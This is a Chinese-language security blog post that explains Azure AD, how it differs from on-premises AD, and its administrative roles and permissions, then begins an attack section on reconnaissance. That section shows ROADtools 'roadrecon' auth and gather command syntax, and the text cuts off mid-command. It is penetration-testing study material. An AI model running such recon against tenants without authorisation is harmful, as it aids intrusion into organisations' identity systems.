

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/b6.png">
  <link rel="icon" type="image/png" href="/img/b6.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Gr3yy">
  <meta name="keywords" content="">
  <title>Azure AD attack - Gr3yy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"gr3yyy123.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Gr3yy's B1og</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Azure AD attack">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-11-09 05:00" pubdate>
        November 9, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.5k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      68
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Azure AD attack</h1>
            
            <div class="markdown-body">
              <h1 id="Azure-AD-attack"><a href="#Azure-AD-attack" class="headerlink" title="Azure AD attack"></a>Azure AD attack</h1><p>​                                                                        author：Gr3yy</p>
<p><strong><em>真常应物，真常得性，常应常静，常清静矣</em></strong></p>
<p>真的鸽了好久了|- _-|，一直想写点东西，正好最近项目里遇到了Azure的环境，之前也没了解过，和本地的域环境还是有些区别和相同点，所以抽时间学习一下，就一点点写叭</p>
<p><em>本文主要参考文章为微软官方文档以及adsecurity.org文章，以及**<a target="_blank" rel="noopener" href="https://github.com/Cloud-Architekt/AzureAD-Attack-Defense">AzureAD-Attack-Defense</a>**</em></p>
<h2 id="什么是Azure-AD"><a href="#什么是Azure-AD" class="headerlink" title="什么是Azure AD"></a>什么是Azure AD</h2><p>开始之前当然要了解一下什么是AAD：</p>
<p>用微软自己的话来说：</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Azure</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span><span class="hljs-punctuation">)</span> 是 <span class="hljs-variable">Microsoft</span> 基于云的身份和访问管理服务，可帮助您的员工登录并访问以下资源：<br>	<span class="hljs-number">1.</span>外部资源，例如 <span class="hljs-variable">Microsoft</span> <span class="hljs-number">365</span>、<span class="hljs-variable">Azure</span> 门户和数以千计的其他 <span class="hljs-variable">SaaS</span> 应用程序。<br>	<span class="hljs-number">2.</span>内部资源，例如您公司网络和 <span class="hljs-variable">Intranet</span> 上的应用程序，以及您自己的组织开发的任何云应用程序。有关为组织创建租户的详细信息，请参阅快速入门：在 <span class="hljs-variable">Azure</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 中创建新租户。<br></code></pre></td></tr></table></figure>
<p>因此：</p>
<ul>
<li>AAD是一种多租户云目录和<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/develop/authentication-scenarios">身份验证</a>服务</li>
<li>使用office365用于传统域内的帐户、组和角色</li>
<li>提供身份验证的同时也是身份提供者</li>
</ul>
<h3 id="Azure-AD-与传统AD的区别"><a href="#Azure-AD-与传统AD的区别" class="headerlink" title="Azure AD 与传统AD的区别"></a>Azure AD 与传统AD的区别</h3><p>不要被AAD的名字误导，AAD不是简单的布在云上AD环境，我们还是先用微软的一句话来描述</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Azure</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 是云标识和访问管理解决方案的下一个演变。<span class="hljs-variable">Microsoft</span> 在 <span class="hljs-variable">Windows</span> <span class="hljs-number">2000</span> 中引入了 <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> 域服务，使组织能够使用每个用户的单一身份来管理多个本地基础结构组件和系统。<br></code></pre></td></tr></table></figure>
<p>OK ，那么下面来看看他们之间的区别，当然以下概念也只是简单的描述，各个概念的具体描述请参考官方文档。</p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center">AD</th>
<th align="center">Azure AD</th>
</tr>
</thead>
<tbody><tr>
<td align="center">创建用户</td>
<td align="center">企业管理者手动创建或者使用自动配置系统和hr系统联动</td>
<td align="center">现有 AD 组织使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sync-whatis">Azure AD Connect</a>将身份同步到云。可与云HR系统联动</td>
</tr>
<tr>
<td align="center">权限管理 与 组</td>
<td align="center">域管理者将用户分配进不同的组，应用与服务根据组可分配不同权限</td>
<td align="center">AAD也提供组，管理员也可通过组来授予不同权限。管理员可通过查询将用户动态包含进组。Azure可以使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/governance/entitlement-management-overview">Entitlement management</a> 机制，通过访问包来管理用户权限</td>
</tr>
<tr>
<td align="center">域管理</td>
<td align="center">企业通过域、组织和组的组合，委派管理权限来管理它控制的目录和资源。</td>
<td align="center">Azure AD使用Privileged Identity Management (PIM)来进基于角色的管理权限委派</td>
</tr>
<tr>
<td align="center">凭证管理</td>
<td align="center">Active Directory 中的凭据基于密码、证书身份验证和智能卡身份验证。使用基于密码长度、到期时间和复杂性的密码策略来管理密码。</td>
<td align="center">Azure提供智能密码保护以及多因素身份认证</td>
</tr>
<tr>
<td align="center">认证</td>
<td align="center">大多数本地应用程序使用 LDAP、Windows 集成身份验证（NTLM 和 Kerberos）或基于标头的身份验证来控制对用户的访问。</td>
<td align="center">Azure AD 可以使用在本地运行的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/app-proxy/application-proxy">Azure AD 应用程序代理</a>提供对这些类型的本地应用程序的访问。使用此方法 Azure AD 可以在迁移或需要与旧应用共存时使用 Kerberos 对本地 Active Directory 用户进行身份验证。</td>
</tr>
<tr>
<td align="center">SaaS与外部应用</td>
<td align="center">本地AD不支持saas,可通过联合ADFS</td>
<td align="center">作为oauth2身份认证方式与Saas联动</td>
</tr>
<tr>
<td align="center">服务</td>
<td align="center">在AD中运行的服务通常使用 AD 服务帐户或组托管服务帐户 (gMSA) 来运行。这些应用将继承服务帐户的权限</td>
<td align="center">Azure AD 提供<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/">托管标识</a>以在云中运行其他工作负载。这些身份的生命周期由 Azure AD 管理并与资源提供者绑定，不能用于其他目的以获取后门访问权限。</td>
</tr>
<tr>
<td align="center">移动设备</td>
<td align="center">Active Directory 本身不支持没有第三方解决方案的移动设备</td>
<td align="center">Microsoft 的移动设备管理解决方案 Microsoft Intune 与 Azure AD 集成。Microsoft Intune 向身份系统提供设备状态信息以在身份验证期间进行评估。</td>
</tr>
<tr>
<td align="center">windows desktop</td>
<td align="center">可入域，通过域策略管理</td>
<td align="center">Windows 设备可以加入 Azure AD。条件访问可以检查设备是否已加入 Azure AD。Windows 设备也可以使用<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/intune/what-is-intune">Microsoft Intune</a>进行管理。在这种情况下，条件访问将在允许访问应用程序之前考虑设备是否合规（例如，最新的安全补丁和病毒签名）。</td>
</tr>
</tbody></table>
<p><img src="https://adsecurity.org/wp-content/uploads/2020/01/image-1024x556.png" srcset="/img/loading.gif" alt="img"></p>
<h3 id="GUID-与-SID"><a href="#GUID-与-SID" class="headerlink" title="GUID 与 SID"></a>GUID 与 SID</h3><p>不同于AD使用sid唯一标识用户，Azure AD使用自己独有的GUID表示用户</p>
<p>通过将 “S-1-12-1-” 与 GUID 的简单拆分处理后进行组合是可以将用户的GUID 转换成 SID 的：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">[base16(<span class="hljs-built_in">a1</span>)]-[base16(<span class="hljs-built_in">a2</span>)]-[ base16(<span class="hljs-built_in">a3</span>)]-[base16(<span class="hljs-built_in">a4</span>)]<br>S-<span class="hljs-number">1</span>–<span class="hljs-number">12</span>–<span class="hljs-number">1</span>-[base10(<span class="hljs-built_in">a1</span>)]-[ base10(<span class="hljs-built_in">a2</span>)]-[ base10(<span class="hljs-built_in">a3</span>)]-[ base10(<span class="hljs-built_in">a4</span>)]<br></code></pre></td></tr></table></figure>
<p>例如：当GUID 为 <code>6aa89ecb-1f8f-4d92–810d-b0dce30b6c82</code> 时，转换后为 <code>S-1–12–1–1789435595–1301421967–3702525313–2188119011</code></p>
<h3 id="管理Azure-AD"><a href="#管理Azure-AD" class="headerlink" title="管理Azure AD"></a>管理Azure AD</h3><ul>
<li><p>不同于传统AD的管理工具，Azure AD主要使用 <a target="_blank" rel="noopener" href="https://portal.azure.com/">https://portal.azure.com</a> 控制台管理Azure AD</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2020/01/image-8-1024x928.png" srcset="/img/loading.gif" alt="img"></p>
</li>
<li><p>还可以与本地一样通过 powershell 管理AAD。</p>
</li>
</ul>
<p>由于 Azure AD 没有 LDAP，因此与 涉及AAD 的接口一般通过 Graph API（或 PowerShell 模块）进行连接。</p>
<p>有 2 个主要的 PowerShell 模块用于与 Azure AD 交互：MSOnline和AzureAD，安装命令如下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> MSOnline <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> AzureAD <span class="hljs-literal">-Force</span><br></code></pre></td></tr></table></figure>
<p><img src="/img/article2/image-20211109030143664.png" srcset="/img/loading.gif" alt="image-20211109030143664"></p>
<p>使用文档：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/azuread/get-azureaddomain?view=azureadps-2.0">https://docs.microsoft.com/en-us/powershell/module/azuread/get-azureaddomain?view=azureadps-2.0</a></p>
<p>具体的cmdlet研究我们之后再写</p>
<h3 id="角色与权限"><a href="#角色与权限" class="headerlink" title="角色与权限"></a>角色与权限</h3><p><em><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference">https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference</a></em></p>
<p>Azure AD 用户可以查看有关用户和组的信息，但对可访问的内容有一些限制。在Azure AD中特权用户称为 “ Role “，可以将它理解为一个特权组，为o365应用提供特定管理权限。</p>
<p>以下是官方文档</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">在 <span class="hljs-variable">Azure</span> <span class="hljs-built_in">Active</span> <span class="hljs-built_in">Directory</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span><span class="hljs-punctuation">)</span> 中，如果其他管理员或非管理员需要管理 <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> 资源，您可以为他们分配一个 <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> 角色来提供他们所需的权限。例如，您可以分配角色以允许添加或更改用户、重置用户密码、管理用户许可证或管理域名。<br></code></pre></td></tr></table></figure>
<p>角色很多，这里简单列几个：</p>
<h4 id="认证管理员（Authentication-Administrator）"><a href="#认证管理员（Authentication-Administrator）" class="headerlink" title="认证管理员（Authentication Administrator）"></a>认证管理员（Authentication Administrator）</h4><p>顾名思义，负责管理用户认证的角色组。具有此角色的用户可以为非验证管理员和某些角色设置或重置任何身份验证方法（包括密码）。身份验证管理员也可以要求非验证管理员和某些角色根据现有的非密码凭据（例如 MFA 或 FIDO）重新注册。以下为可读取或修改认证的角色权限列表</p>
<table>
<thead>
<tr>
<th align="left">Password can be reset</th>
<th align="left">Password Admin</th>
<th align="left">Helpdesk Admin</th>
<th align="left">Authentication Admin</th>
<th align="left">User Admin</th>
<th align="left">Privileged Authentication Admin</th>
<th align="left">Global Admin</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Authentication Admin</td>
<td align="left"></td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Directory Readers</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Global Admin</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️*</td>
</tr>
<tr>
<td align="left">Groups Admin</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Guest Inviter</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Helpdesk Admin</td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Message Center Reader</td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Password Admin</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Privileged Authentication Admin</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Privileged Role Admin</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Reports Reader</td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">User (no admin role)</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">User (no admin role, but member of a role-assignable group)</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">User Admin</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
<tr>
<td align="left">Usage Summary Reports Reader</td>
<td align="left"></td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
<td align="left">✔️</td>
</tr>
</tbody></table>
<p>具有此角色的用户可以更改部分有权访问 Azure AD 内部和外部的敏感信息或关键配置的用户的凭据。更改用户的凭据可能意味着能够获取该用户的身份和权限。例如：</p>
<ul>
<li>应用程序注册和企业应用程序所有者，他们可以管理他们拥有的应用程序的凭据。这些应用程序可能在 Azure AD 和其他地方拥有身份认证管理员不拥有的特权。通过此方法，身份验证管理员可以获取应用程序所有者的身份，然后通过更新应用程序的凭据进一步滥用特权应用程序的身份。</li>
<li>Azure 订阅所有者，他们可能有权访问 Azure 中的敏感或私有信息或关键配置。</li>
<li>可以管理组成员身份的安全组和 Microsoft 365 组所有者。这些组可能会授予对 Azure AD 和其他地方的敏感或私有信息或关键配置的访问权限。</li>
<li>Azure AD 之外的其他服务（例如 Exchange Online、Office 安全与合规中心以及人力资源系统）中的管理员。</li>
<li>非管理员，例如可能有权访问敏感或私人信息的高管、法律顾问和人力资源员工。</li>
</ul>
<p>关于身份认证的管理员有：认证管理员、<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-authentication-administrator">特权验证管理员</a>、<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#authentication-policy-administrator">验证策略管理员</a></p>
<table>
<thead>
<tr>
<th align="left">角色</th>
<th align="left">管理用户的身份验证方法</th>
<th align="left">管理用户 MFA</th>
<th align="left">管理 MFA 设置</th>
<th align="left">管理身份验证方法策略</th>
<th align="left">管理密码保护策略</th>
</tr>
</thead>
<tbody><tr>
<td align="left">认证管理员</td>
<td align="left">对某些用户是（见上表）</td>
<td align="left">对某些用户是（见上表）</td>
<td align="left">否</td>
<td align="left">否</td>
<td align="left">否</td>
</tr>
<tr>
<td align="left">特权认证管理员</td>
<td align="left">适用于所有用户</td>
<td align="left">适用于所有用户</td>
<td align="left">否</td>
<td align="left">否</td>
<td align="left">否</td>
</tr>
<tr>
<td align="left">身份验证策略管理员</td>
<td align="left">否</td>
<td align="left">否</td>
<td align="left">是的</td>
<td align="left">是的</td>
<td align="left">是的</td>
</tr>
</tbody></table>
<h4 id="Exchange-管理员（Exchange-Administrator）"><a href="#Exchange-管理员（Exchange-Administrator）" class="headerlink" title="Exchange 管理员（Exchange Administrator）"></a>Exchange 管理员（Exchange Administrator）</h4><p>具有此角色的用户在 Microsoft Exchange Online 中具有全局权限。还能够创建和管理所有 Microsoft 365 组、管理票据和监控服务运行状况。</p>
<table>
<thead>
<tr>
<th align="center">Action</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">microsoft.directory/groups/hiddenMembers/read</td>
<td align="center">读取安全组和 Microsoft 365 组的隐藏成员，包括可分配角色的组</td>
</tr>
<tr>
<td align="center">microsoft.directory/groups.unified/create</td>
<td align="center">创建 Microsoft 365 组，不包括可分配角色的组</td>
</tr>
<tr>
<td align="center">microsoft.directory/groups.unified/delete</td>
<td align="center">删除 Microsoft 365 组，不包括可分配角色的组</td>
</tr>
<tr>
<td align="center">microsoft.directory/groups.unified/restore</td>
<td align="center">还原 Microsoft 365 组</td>
</tr>
<tr>
<td align="center">microsoft.directory/groups.unified/basic/update</td>
<td align="center">更新 Microsoft 365 组的基本属性，不包括可分配角色的组</td>
</tr>
<tr>
<td align="center">microsoft.directory/groups.unified/members/update</td>
<td align="center">更新 Microsoft 365 组的成员，不包括可分配角色的组</td>
</tr>
<tr>
<td align="center">microsoft.directory/groups.unified/owners/update</td>
<td align="center">更新 Microsoft 365 组的所有者，不包括可分配角色的组</td>
</tr>
<tr>
<td align="center">microsoft.azure.serviceHealth/allEntities/allTasks</td>
<td align="center">读取和配置 Azure 服务运行状况</td>
</tr>
<tr>
<td align="center">microsoft.azure.supportTickets/allEntities/allTasks</td>
<td align="center">创建和管理 Azure 支持票据</td>
</tr>
<tr>
<td align="center">microsoft.office365.exchange/allEntities/basic/allTasks</td>
<td align="center">管理 Exchange Online 的所有方面</td>
</tr>
<tr>
<td align="center">microsoft.office365.network/performance/allProperties/read</td>
<td align="center">在 Microsoft 365 管理中心阅读所有网络性能属性</td>
</tr>
<tr>
<td align="center">microsoft.office365.serviceHealth/allEntities/allTasks</td>
<td align="center">在 Microsoft 365 管理中心阅读和配置服务运行状况</td>
</tr>
<tr>
<td align="center">microsoft.office365.supportTickets/allEntities/allTasks</td>
<td align="center">创建和管理 Microsoft 365 服务请求</td>
</tr>
<tr>
<td align="center">microsoft.office365.usageReports/allEntities/allProperties/read</td>
<td align="center">阅读 Office 365 使用情况报告</td>
</tr>
<tr>
<td align="center">microsoft.office365.webPortal/allEntities/standard/read</td>
<td align="center">在 Microsoft 365 管理中心阅读所有资源的基本属性</td>
</tr>
</tbody></table>
<h4 id="Exchange-收件人管理员（Exchange-Recipient-Administrator）"><a href="#Exchange-收件人管理员（Exchange-Recipient-Administrator）" class="headerlink" title="Exchange 收件人管理员（Exchange Recipient Administrator）"></a>Exchange 收件人管理员（Exchange Recipient Administrator）</h4><p>具有此角色的用户对 Exchange Online 中的收件人具有读取访问权限和属性写入的权限。</p>
<table>
<thead>
<tr>
<th align="center">Action</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">microsoft.office365.exchange/allRecipients/allProperties/allTasks</td>
<td align="center">在 Exchange Online 中创建和删除所有收件人，以及读取和更新收件人的所有属性</td>
</tr>
<tr>
<td align="center">microsoft.office365.exchange/messageTracking/allProperties/allTasks</td>
<td align="center">在 Exchange Online 中管理邮件跟踪中的所有任务</td>
</tr>
<tr>
<td align="center">microsoft.office365.exchange/migration/allProperties/allTasks</td>
<td align="center">管理与 Exchange Online 中的收件人迁移相关的所有任务</td>
</tr>
</tbody></table>
<h4 id="全局管理员（Global-Administrator）"><a href="#全局管理员（Global-Administrator）" class="headerlink" title="全局管理员（Global Administrator）"></a>全局管理员（Global Administrator）</h4><p>具有此角色的用户可以访问 Azure AD 中的所有管理功能，以及使用 Azure AD 标识的服务，例如 Microsoft 365 安全中心、Microsoft 365 合规中心、Exchange Online、SharePoint Online 和 Skype for Business Online。此外，全局管理员可以<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin">提升其管理所有 Azure 订阅和管理组的权限</a>。这允许全局管理员使用相应的 Azure AD 租户获得对所有 Azure 资源的完全访问权限。注册 Azure AD 的用户将成为全局管理员。全局管理员可以为任何用户和所有其他管理员重置密码。（默认不超过五个）</p>
<p>可以理解为包含了传统AD的 Enterprise Admins、Domain Admins、Administrators组</p>
<h4 id="特权身份管理（PIM）"><a href="#特权身份管理（PIM）" class="headerlink" title="特权身份管理（PIM）"></a>特权身份管理（PIM）</h4><p>PIM是Azure AD中的一项服务，可用于管理、控制和监视对组织中重要资源的访问。这些资源包括 Azure AD、Azure 和其他 Microsoft 在线服务（例如 Microsoft 365 或 Microsoft Intune）中的资源。当管理员需要管理员权限时，他们可以通过 PIM（可以发送以供批准或自动批准）请求和获得访问权限。Microsoft 建议角色中的所有帐户都由 PIM 管理。</p>
<p>安装用于PIM的powershell模块</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> Microsoft.Azure.ActiveDirectory.PIM.PSModule<br></code></pre></td></tr></table></figure>


<h2 id="攻击Azure-AD"><a href="#攻击Azure-AD" class="headerlink" title="攻击Azure AD"></a>攻击Azure AD</h2><p>OK，介绍告一段落，下面我们可以开始正式的攻击探讨啦。</p>
<h3 id="信息侦察"><a href="#信息侦察" class="headerlink" title="信息侦察"></a>信息侦察</h3><p><strong><em>微软的门户列表</em></strong> ：<a target="_blank" rel="noopener" href="https://msportals.io/">https://msportals.io/</a></p>
<p><img src="C:\Users\36388\AppData\Roaming\Typora\typora-user-images\image-20211108082557627.png" srcset="/img/loading.gif" alt="image-20211108082557627"></p>
<p>无论是打点还是内网渗透，信息收集永远都是最重要的一步。好的信息收集就是一次渗透成功的一半。</p>
<h4 id="工具-框架"><a href="#工具-框架" class="headerlink" title="工具 \ 框架"></a>工具 \ 框架</h4><p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/ROADtools">dirkjanm/<em>ROADtools</em></a></p>
<p><img src="https://github.com/dirkjanm/ROADtools/raw/master/roadrecon/frontend/src/assets/rt_transparent.svg" srcset="/img/loading.gif" alt="ROADtools logo"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">pipenv shell<br>roadrecon auth [-<span class="hljs-type">h</span>] [-<span class="hljs-type">u</span> <span class="hljs-type">USERNAME</span>] [-<span class="hljs-type">p</span> <span class="hljs-type">PASSWORD</span>] [-<span class="hljs-type">t</span> <span class="hljs-type">TENANT</span>] [-<span class="hljs-type">c</span> <span class="hljs-type">CLIENT</span>] [--<span class="hljs-type">as</span>-<span class="hljs-type">app</span>] [--<span class="hljs-type">device</span>-<span class="hljs-type">code</span>] [--<span class="hljs-type">access</span>-<span class="hljs-type">token</span> <span class="hljs-type">ACCESS_TOKEN</span>] [--<span class="hljs-type">refresh</span>-<span class="hljs-type">token</span> <span class="hljs-type">REFRESH_TOKEN</span>] [-<span class="hljs-type">f</span> <span class="hljs-type">TOKENFILE</span>] [--<span class="hljs-type">tokens</span>-<span class="hljs-type">stdout</span>]<br>roadrecon gather [-<span class="hljs-type">h</span>] [-<span class="hljs-type">d</span> <span class="hljs-type">DATABASE</span>] [-<span class="hljs-type">f</span> <span class="hljs-type">TOKENFILE</span>] [--<span class="hljs-type">tokens</span>-<span class="hljs-type">stdin</span>] [--<span class="hljs-type">mfa</span>]<br>roadrecon auth <span class="hljs-literal">-u</span> test<span 